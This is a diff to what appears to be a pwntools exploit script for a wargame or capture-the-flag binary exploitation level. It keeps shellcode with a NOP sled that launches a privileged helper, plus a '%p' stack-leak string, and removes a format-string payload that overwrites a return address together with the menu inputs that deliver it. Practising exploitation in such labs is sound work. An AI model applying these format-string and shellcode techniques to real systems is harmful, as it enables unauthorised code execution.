@@ -7,6 +7,8 @@ import os
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or '/var/challenge/level5/5')
+# exe = context.binary = ELF(args.EXE or '/home/iel44jez/5AAAAAAA')
+
 
 # Many built-in settings can be controlled on the command-line and show up
 # in "args".  For example, to dump all data sent/received, and disable ASLR
@@ -15,7 +17,6 @@ exe = context.binary = ELF(args.EXE or '/var/challenge/level5/5')
 
 l33tpath = '/usr/local/bin/l33t'
 shellcode = asm(shellcraft.execve(path=l33tpath, argv=[l33tpath]))
-#shellcode = asm(shellcraft.syscall('SYS_execve', l33tpath, 'rsp', 0, 0))
 nop_sled = b'\x90' * 200
 shellcode = nop_sled + shellcode
 
@@ -63,9 +64,7 @@ continue
 
 
 # Create a format string payload
-overwrite_addr = (0x7fffffffe7b8)
-overwrite_with = p64(0x7fffffffeec8 + 50) # this is from debugging with GDB, it is in env
-payload = fmtstr_payload(22, {overwrite_addr: overwrite_with})
+
 
 
 # Use to leak
@@ -73,17 +72,7 @@ leak = b"%p."* 40
 
 io = start()
 
-# add a new pair
-io.sendline("1")
-# add the name
-io.sendline("fmtstring username")
-# overwrite return addr
-io.sendline(payload)
 
-# read the password
-io.sendline("3") # select "read pw"
-io.sendline("0") # select account 0
-io.sendline("1") # select "exit to main menu"
 
 # read the password
 # io.sendline("3")
